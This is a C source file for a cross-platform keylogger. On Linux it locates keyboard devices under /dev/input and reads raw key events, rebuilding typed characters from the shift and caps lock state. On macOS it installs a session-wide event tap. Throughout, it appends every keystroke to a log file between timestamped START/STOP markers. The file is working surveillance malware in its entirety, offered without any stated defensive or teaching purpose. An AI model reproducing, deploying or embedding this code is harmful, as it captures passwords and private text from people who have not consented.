#include "keylogger.h"

#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#ifdef __linux__
#include <dirent.h>
#include <fcntl.h>
#include <linux/input.h>
#include <poll.h>
#include <sys/ioctl.h>
#elif defined(__APPLE__)
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
#endif

static void keylogger_write_token(keylogger_state_t *state, const char *token);
static void keylogger_write_marker(keylogger_state_t *state, const char *action);
static void format_key_token(unsigned int keycode, char *token, size_t token_len);

#ifdef __linux__
static void *linux_keylogger_thread(void *arg);
static void linux_update_modifiers(keylogger_state_t *state, unsigned int keycode, int value);
static char linux_apply_shift(keylogger_state_t *state, unsigned int keycode);
static int linux_is_keyboard_device(const char *device_path);
#elif defined(__APPLE__)
static CGEventRef macos_keylogger_callback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon);
static void *macos_keylogger_thread(void *arg);
#endif

void keylogger_state_init(keylogger_state_t *state) {
    memset(state, 0, sizeof(*state));
    (void)pthread_mutex_init(&state->lock, NULL);
#ifdef __linux__
    state->input_fd = -1;
#endif
}

void keylogger_state_destroy(keylogger_state_t *state) {
    char error[128];

    if (state->active) {
        (void)keylogger_stop(state, error, sizeof(error));
    }

    (void)pthread_mutex_destroy(&state->lock);
}

const char *keylogger_platform_default_device(void) {
#ifdef __linux__
    static char device_path[KEYLOGGER_DEVICE_MAX] = {0};
    static int scanned = 0;

    if (!scanned) {
        if (keylogger_find_keyboard_device(device_path, sizeof(device_path)) == 0) {
            scanned = 1;
            return device_path;
        }
        scanned = 1;
        return "/dev/input/event0";
    }

    if (device_path[0] != '\0') {
        return device_path;
    }
    return "/dev/input/event0";
#elif defined(__APPLE__)
    return "event-tap";
#else
    return "unsupported";
#endif
}

#ifdef __linux__
static int linux_is_keyboard_device(const char *device_path) {
    unsigned long evbit[BITS_TO_LONGS(EV_CNT)];
    unsigned long keybit[BITS_TO_LONGS(KEY_CNT)];
    int fd;
    int ret = 0;

    fd = open(device_path, O_RDONLY | O_NONBLOCK);
    if (fd < 0) {
        return 0;
    }

    memset(evbit, 0, sizeof(evbit));
    memset(keybit, 0, sizeof(keybit));

    if (ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), evbit) < 0) {
        close(fd);
        return 0;
    }

    if (!(evbit[0] & (1 << EV_KEY))) {
        close(fd);
        return 0;
    }

    if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keybit)), keybit) < 0) {
        close(fd);
        return 0;
    }

    if (keybit[BTN_LEFT / BITS_PER_LONG] & (1UL << (BTN_LEFT % BITS_PER_LONG))) {
        close(fd);
        return 0;
    }

    if (keybit[KEY_A / BITS_PER_LONG] & (1UL << (KEY_A % BITS_PER_LONG))) {
        ret = 1;
    }

    close(fd);
    return ret;
}

int keylogger_find_keyboard_device(char *device_out, size_t device_out_len) {
    const char *by_path_dirs[] = {
        "/dev/input/by-path",
        "/dev/input/by-id",
        NULL
    };
    DIR *dir;
    struct dirent *entry;
    char path_buf[KEYLOGGER_DEVICE_MAX];
    int i;
    int found = 0;

    for (i = 0; by_path_dirs[i] != NULL && !found; i++) {
        dir = opendir(by_path_dirs[i]);
        if (dir == NULL) {
            continue;
        }

        while ((entry = readdir(dir)) != NULL && !found) {
            if (entry->d_name[0] == '.') {
                continue;
            }

            if (strstr(entry->d_name, "-kbd") != NULL ||
                strstr(entry->d_name, "-keyboard") != NULL ||
                strstr(entry->d_name, "Keyboard") != NULL) {

                snprintf(path_buf, sizeof(path_buf), "%s/%s", by_path_dirs[i], entry->d_name);

                if (linux_is_keyboard_device(path_buf)) {
                    snprintf(device_out, device_out_len, "%s", path_buf);
                    found = 1;
                }
            }
        }

        closedir(dir);
    }

    if (!found) {
        for (i = 0; i < 32; i++) {
            snprintf(path_buf, sizeof(path_buf), "/dev/input/event%d", i);

            if (linux_is_keyboard_device(path_buf)) {
                snprintf(device_out, device_out_len, "%s", path_buf);
                found = 1;
                break;
            }
        }
    }

    return found ? 0 : -1;
}
#endif

int keylogger_start(
    keylogger_state_t *state,
    const char *device_path,
    const char *log_path,
    char *error,
    size_t error_len
) {
    const char *resolved_path;

    pthread_mutex_lock(&state->lock);
    if (state->active) {
        pthread_mutex_unlock(&state->lock);
        snprintf(error, error_len, "keylogger already running");
        return -1;
    }
    pthread_mutex_unlock(&state->lock);

    if (device_path == NULL || device_path[0] == '\0' || strcmp(device_path, KEYLOGGER_AUTO_DEVICE) == 0) {
        resolved_path = keylogger_platform_default_device();
    } else {
        resolved_path = device_path;
    }

    state->log_fp = fopen(log_path != NULL ? log_path : KEYLOGGER_LOG_FILE, "a");
    if (state->log_fp == NULL) {
        snprintf(error, error_len, "cannot open keylog file: %s", strerror(errno));
        return -1;
    }

#ifdef __linux__
    state->input_fd = open(resolved_path, O_RDONLY | O_NONBLOCK);
    if (state->input_fd < 0) {
        snprintf(error, error_len, "cannot open %s: %s", resolved_path, strerror(errno));
        fclose(state->log_fp);
        state->log_fp = NULL;
        return -1;
    }

    state->mod_state.lshift = 0;
    state->mod_state.rshift = 0;
    state->mod_state.lctrl = 0;
    state->mod_state.rctrl = 0;
    state->mod_state.lalt = 0;
    state->mod_state.ralt = 0;
    state->mod_state.caps_lock = 0;
#elif defined(__APPLE__)
    state->event_tap = CGEventTapCreate(
        kCGSessionEventTap,
        kCGHeadInsertEventTap,
        0,
        CGEventMaskBit(kCGEventKeyDown),
        macos_keylogger_callback,
        state
    );

    if (state->event_tap == NULL) {
        snprintf(error, error_len, "cannot create event tap; Accessibility permission is likely required");
        fclose(state->log_fp);
        state->log_fp = NULL;
        return -1;
    }

    state->run_loop_source = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, (CFMachPortRef)state->event_tap, 0);
    if (state->run_loop_source == NULL) {
        snprintf(error, error_len, "cannot create event tap run loop source");
        CFRelease((CFTypeRef)state->event_tap);
        state->event_tap = NULL;
        fclose(state->log_fp);
        state->log_fp = NULL;
        return -1;
    }
#else
    snprintf(error, error_len, "keylogger is not supported on this platform");
    fclose(state->log_fp);
    state->log_fp = NULL;
    return -1;
#endif

    pthread_mutex_lock(&state->lock);
    state->running = 1;
    state->active = 1;
    snprintf(state->device_path, sizeof(state->device_path), "%s", resolved_path);
    pthread_mutex_unlock(&state->lock);

    keylogger_write_marker(state, "START");

#ifdef __linux__
    if (pthread_create(&state->thread, NULL, linux_keylogger_thread, state) != 0) {
#elif defined(__APPLE__)
    if (pthread_create(&state->thread, NULL, macos_keylogger_thread, state) != 0) {
#endif
        pthread_mutex_lock(&state->lock);
        state->running = 0;
        state->active = 0;
        state->device_path[0] = '\0';
        pthread_mutex_unlock(&state->lock);
#ifdef __linux__
        close(state->input_fd);
        state->input_fd = -1;
#elif defined(__APPLE__)
        if (state->run_loop_source != NULL) {
            CFRelease((CFTypeRef)state->run_loop_source);
            state->run_loop_source = NULL;
        }
        if (state->event_tap != NULL) {
            CFRelease((CFTypeRef)state->event_tap);
            state->event_tap = NULL;
        }
#endif
        fclose(state->log_fp);
        state->log_fp = NULL;
        snprintf(error, error_len, "cannot create keylogger thread");
        return -1;
    }

    state->thread_started = 1;
    return 0;
}

int keylogger_stop(keylogger_state_t *state, char *error, size_t error_len) {
    int should_join = 0;

    pthread_mutex_lock(&state->lock);
    if (!state->active) {
        pthread_mutex_unlock(&state->lock);
        return 0;
    }

    state->running = 0;
    should_join = state->thread_started;
    pthread_mutex_unlock(&state->lock);

    if (should_join) {
        (void)pthread_join(state->thread, NULL);
    }

    keylogger_write_marker(state, "STOP");

    pthread_mutex_lock(&state->lock);
    state->thread_started = 0;
    state->active = 0;
    state->device_path[0] = '\0';
#ifdef __linux__
    if (state->input_fd >= 0) {
        close(state->input_fd);
        state->input_fd = -1;
    }
#elif defined(__APPLE__)
    if (state->run_loop_source != NULL) {
        CFRelease((CFTypeRef)state->run_loop_source);
        state->run_loop_source = NULL;
    }
    if (state->event_tap != NULL) {
        CFRelease((CFTypeRef)state->event_tap);
        state->event_tap = NULL;
    }
#endif
    if (state->log_fp != NULL) {
        fclose(state->log_fp);
        state->log_fp = NULL;
    }
    pthread_mutex_unlock(&state->lock);

    (void)error;
    (void)error_len;
    return 0;
}

static void keylogger_write_token(keylogger_state_t *state, const char *token) {
    pthread_mutex_lock(&state->lock);
    if (state->log_fp != NULL) {
        fputs(token, state->log_fp);
        fflush(state->log_fp);
    }
    pthread_mutex_unlock(&state->lock);
}

static void keylogger_write_marker(keylogger_state_t *state, const char *action) {
    time_t now;
    char line[128];

    now = time(NULL);
    snprintf(line, sizeof(line), "\n[%s %ld]\n", action, (long)now);
    keylogger_write_token(state, line);
}

#ifdef __linux__
static void linux_update_modifiers(keylogger_state_t *state, unsigned int keycode, int value) {
    int pressed = (value == 1);

    switch (keycode) {
    case KEY_LEFTSHIFT:  state->mod_state.lshift = pressed; break;
    case KEY_RIGHTSHIFT: state->mod_state.rshift = pressed; break;
    case KEY_LEFTCTRL:   state->mod_state.lctrl = pressed; break;
    case KEY_RIGHTCTRL:  state->mod_state.rctrl = pressed; break;
    case KEY_LEFTALT:    state->mod_state.lalt = pressed; break;
    case KEY_RIGHTALT:   state->mod_state.ralt = pressed; break;
    case KEY_CAPSLOCK:
        if (pressed) {
            state->mod_state.caps_lock = !state->mod_state.caps_lock;
        }
        break;
    default:
        break;
    }
}

static char linux_apply_shift(keylogger_state_t *state, unsigned int keycode) {
    int shift_on = state->mod_state.lshift || state->mod_state.rshift;
    int caps_on = state->mod_state.caps_lock;

    switch (keycode) {
    case KEY_A: return (shift_on ^ caps_on) ? 'A' : 'a';
    case KEY_B: return (shift_on ^ caps_on) ? 'B' : 'b';
    case KEY_C: return (shift_on ^ caps_on) ? 'C' : 'c';
    case KEY_D: return (shift_on ^ caps_on) ? 'D' : 'd';
    case KEY_E: return (shift_on ^ caps_on) ? 'E' : 'e';
    case KEY_F: return (shift_on ^ caps_on) ? 'F' : 'f';
    case KEY_G: return (shift_on ^ caps_on) ? 'G' : 'g';
    case KEY_H: return (shift_on ^ caps_on) ? 'H' : 'h';
    case KEY_I: return (shift_on ^ caps_on) ? 'I' : 'i';
    case KEY_J: return (shift_on ^ caps_on) ? 'J' : 'j';
    case KEY_K: return (shift_on ^ caps_on) ? 'K' : 'k';
    case KEY_L: return (shift_on ^ caps_on) ? 'L' : 'l';
    case KEY_M: return (shift_on ^ caps_on) ? 'M' : 'm';
    case KEY_N: return (shift_on ^ caps_on) ? 'N' : 'n';
    case KEY_O: return (shift_on ^ caps_on) ? 'O' : 'o';
    case KEY_P: return (shift_on ^ caps_on) ? 'P' : 'p';
    case KEY_Q: return (shift_on ^ caps_on) ? 'Q' : 'q';
    case KEY_R: return (shift_on ^ caps_on) ? 'R' : 'r';
    case KEY_S: return (shift_on ^ caps_on) ? 'S' : 's';
    case KEY_T: return (shift_on ^ caps_on) ? 'T' : 't';
    case KEY_U: return (shift_on ^ caps_on) ? 'U' : 'u';
    case KEY_V: return (shift_on ^ caps_on) ? 'V' : 'v';
    case KEY_W: return (shift_on ^ caps_on) ? 'W' : 'w';
    case KEY_X: return (shift_on ^ caps_on) ? 'X' : 'x';
    case KEY_Y: return (shift_on ^ caps_on) ? 'Y' : 'y';
    case KEY_Z: return (shift_on ^ caps_on) ? 'Z' : 'z';
    case KEY_1: return shift_on ? '!' : '1';
    case KEY_2: return shift_on ? '@' : '2';
    case KEY_3: return shift_on ? '#' : '3';
    case KEY_4: return shift_on ? '$' : '4';
    case KEY_5: return shift_on ? '%' : '5';
    case KEY_6: return shift_on ? '^' : '6';
    case KEY_7: return shift_on ? '&' : '7';
    case KEY_8: return shift_on ? '*' : '8';
    case KEY_9: return shift_on ? '(' : '9';
    case KEY_0: return shift_on ? ')' : '0';
    case KEY_MINUS:      return shift_on ? '_' : '-';
    case KEY_EQUAL:      return shift_on ? '+' : '=';
    case KEY_LEFTBRACE:  return shift_on ? '{' : '[';
    case KEY_RIGHTBRACE: return shift_on ? '}' : ']';
    case KEY_BACKSLASH:  return shift_on ? '|' : '\\';
    case KEY_SEMICOLON:  return shift_on ? ':' : ';';
    case KEY_APOSTROPHE: return shift_on ? '"' : '\'';
    case KEY_COMMA:      return shift_on ? '<' : ',';
    case KEY_DOT:        return shift_on ? '>' : '.';
    case KEY_SLASH:      return shift_on ? '?' : '/';
    case KEY_GRAVE:      return shift_on ? '~' : '`';
    default: return '\0';
    }
}
#endif

static void format_key_token(unsigned int keycode, char *token, size_t token_len) {
    switch (keycode) {
#ifdef __linux__
        case KEY_SPACE:
        case KEY_ENTER:
        case KEY_TAB:
        case KEY_BACKSPACE:
        case KEY_ESC:
        case KEY_LEFT:
        case KEY_RIGHT:
        case KEY_UP:
        case KEY_DOWN:
        case KEY_HOME:
        case KEY_END:
        case KEY_PAGEUP:
        case KEY_PAGEDOWN:
        case KEY_INSERT:
        case KEY_DELETE:
        case KEY_F1:
        case KEY_F2:
        case KEY_F3:
        case KEY_F4:
        case KEY_F5:
        case KEY_F6:
        case KEY_F7:
        case KEY_F8:
        case KEY_F9:
        case KEY_F10:
        case KEY_F11:
        case KEY_F12:
            break;
#elif defined(__APPLE__)
        case kVK_Space:
        case kVK_Return:
        case kVK_Tab:
        case kVK_Delete:
        case kVK_Escape:
        case kVK_LeftArrow:
        case kVK_RightArrow:
        case kVK_UpArrow:
        case kVK_DownArrow:
        case kVK_Home:
        case kVK_End:
        case kVK_PageUp:
        case kVK_PageDown:
        case kVK_ForwardDelete:
        case kVK_F1:
        case kVK_F2:
        case kVK_F3:
        case kVK_F4:
        case kVK_F5:
        case kVK_F6:
        case kVK_F7:
        case kVK_F8:
        case kVK_F9:
        case kVK_F10:
        case kVK_F11:
        case kVK_F12:
            break;
#else
            break;
#endif
        default:
            snprintf(token, token_len, "[KEY_%u]", keycode);
            return;
    }

#ifdef __linux__
    switch (keycode) {
        case KEY_SPACE:     snprintf(token, token_len, " ");          break;
        case KEY_ENTER:     snprintf(token, token_len, "\n");         break;
        case KEY_TAB:       snprintf(token, token_len, "\t");         break;
        case KEY_BACKSPACE: snprintf(token, token_len, "[BACKSPACE]"); break;
        case KEY_ESC:       snprintf(token, token_len, "[ESC]");      break;
        case KEY_LEFT:      snprintf(token, token_len, "[LEFT]");     break;
        case KEY_RIGHT:     snprintf(token, token_len, "[RIGHT]");    break;
        case KEY_UP:        snprintf(token, token_len, "[UP]");       break;
        case KEY_DOWN:      snprintf(token, token_len, "[DOWN]");     break;
        case KEY_HOME:      snprintf(token, token_len, "[HOME]");     break;
        case KEY_END:       snprintf(token, token_len, "[END]");      break;
        case KEY_PAGEUP:    snprintf(token, token_len, "[PGUP]");     break;
        case KEY_PAGEDOWN:  snprintf(token, token_len, "[PGDN]");     break;
        case KEY_INSERT:    snprintf(token, token_len, "[INS]");      break;
        case KEY_DELETE:    snprintf(token, token_len, "[DEL]");      break;
        case KEY_F1:        snprintf(token, token_len, "[F1]");       break;
        case KEY_F2:        snprintf(token, token_len, "[F2]");       break;
        case KEY_F3:        snprintf(token, token_len, "[F3]");       break;
        case KEY_F4:        snprintf(token, token_len, "[F4]");       break;
        case KEY_F5:        snprintf(token, token_len, "[F5]");       break;
        case KEY_F6:        snprintf(token, token_len, "[F6]");       break;
        case KEY_F7:        snprintf(token, token_len, "[F7]");       break;
        case KEY_F8:        snprintf(token, token_len, "[F8]");       break;
        case KEY_F9:        snprintf(token, token_len, "[F9]");       break;
        case KEY_F10:       snprintf(token, token_len, "[F10]");      break;
        case KEY_F11:       snprintf(token, token_len, "[F11]");      break;
        case KEY_F12:       snprintf(token, token_len, "[F12]");      break;
        default:            snprintf(token, token_len, "[KEY_%u]", keycode); break;
    }
#elif defined(__APPLE__)
    switch (keycode) {
        case kVK_Space:        snprintf(token, token_len, " ");         break;
        case kVK_Return:       snprintf(token, token_len, "\n");        break;
        case kVK_Tab:          snprintf(token, token_len, "\t");        break;
        case kVK_Delete:       snprintf(token, token_len, "[BACKSPACE]");break;
        case kVK_Escape:       snprintf(token, token_len, "[ESC]");     break;
        case kVK_LeftArrow:    snprintf(token, token_len, "[LEFT]");    break;
        case kVK_RightArrow:   snprintf(token, token_len, "[RIGHT]");   break;
        case kVK_UpArrow:      snprintf(token, token_len, "[UP]");      break;
        case kVK_DownArrow:    snprintf(token, token_len, "[DOWN]");    break;
        case kVK_Home:         snprintf(token, token_len, "[HOME]");    break;
        case kVK_End:          snprintf(token, token_len, "[END]");     break;
        case kVK_PageUp:       snprintf(token, token_len, "[PGUP]");    break;
        case kVK_PageDown:     snprintf(token, token_len, "[PGDN]");    break;
        case kVK_ForwardDelete:snprintf(token, token_len, "[DEL]");     break;
        case kVK_F1:           snprintf(token, token_len, "[F1]");      break;
        case kVK_F2:           snprintf(token, token_len, "[F2]");      break;
        case kVK_F3:           snprintf(token, token_len, "[F3]");      break;
        case kVK_F4:           snprintf(token, token_len, "[F4]");      break;
        case kVK_F5:           snprintf(token, token_len, "[F5]");      break;
        case kVK_F6:           snprintf(token, token_len, "[F6]");      break;
        case kVK_F7:           snprintf(token, token_len, "[F7]");      break;
        case kVK_F8:           snprintf(token, token_len, "[F8]");      break;
        case kVK_F9:           snprintf(token, token_len, "[F9]");      break;
        case kVK_F10:          snprintf(token, token_len, "[F10]");     break;
        case kVK_F11:          snprintf(token, token_len, "[F11]");     break;
        case kVK_F12:          snprintf(token, token_len, "[F12]");     break;
        default:               snprintf(token, token_len, "[KEY_%u]", keycode); break;
    }
#endif
}

#ifdef __linux__
static void *linux_keylogger_thread(void *arg) {
    keylogger_state_t *state = (keylogger_state_t *)arg;

    while (1) {
        struct pollfd poll_fd;
        struct input_event event;
        int ready;
        int running;

        pthread_mutex_lock(&state->lock);
        running = state->running;
        poll_fd.fd = state->input_fd;
        pthread_mutex_unlock(&state->lock);

        if (!running) {
            break;
        }

        poll_fd.events = POLLIN;
        poll_fd.revents = 0;

        ready = poll(&poll_fd, 1, 250);
        if (ready < 0) {
            if (errno == EINTR) {
                continue;
            }
            break;
        }

        if (ready == 0 || !(poll_fd.revents & POLLIN)) {
            continue;
        }

        while (read(poll_fd.fd, &event, sizeof(event)) == (ssize_t)sizeof(event)) {
            if (event.type == EV_KEY && (event.value == 1 || event.value == 2)) {
                linux_update_modifiers(state, event.code, event.value);

                char shifted = linux_apply_shift(state, event.code);
                char token[64];

                if (shifted != '\0') {
                    snprintf(token, sizeof(token), "%c", shifted);
                } else {
                    format_key_token(event.code, token, sizeof(token));
                }

                keylogger_write_token(state, token);
            }
        }

        if (errno != EAGAIN && errno != EWOULDBLOCK && errno != EINTR) {
            break;
        }
    }

    return NULL;
}
#elif defined(__APPLE__)
static CGEventRef macos_keylogger_callback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    keylogger_state_t *state = (keylogger_state_t *)refcon;
    char token[32];
    CGKeyCode keycode;

    (void)proxy;

    if (type != kCGEventKeyDown) {
        return event;
    }

    keycode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
    format_key_token((unsigned int)keycode, token, sizeof(token));
    keylogger_write_token(state, token);
    return event;
}

static void *macos_keylogger_thread(void *arg) {
    keylogger_state_t *state = (keylogger_state_t *)arg;
    CFMachPortRef tap = (CFMachPortRef)state->event_tap;
    CFRunLoopSourceRef source = (CFRunLoopSourceRef)state->run_loop_source;
    CFRunLoopRef run_loop = CFRunLoopGetCurrent();

    CFRunLoopAddSource(run_loop, source, kCFRunLoopCommonModes);
    CGEventTapEnable(tap, true);

    while (1) {
        int running;

        pthread_mutex_lock(&state->lock);
        running = state->running;
        pthread_mutex_unlock(&state->lock);

        if (!running) {
            break;
        }

        (void)CFRunLoopRunInMode(kCFRunLoopDefaultMode, 0.25, false);
    }

    CFRunLoopRemoveSource(run_loop, source, kCFRunLoopCommonModes);
    return NULL;
}
#endif
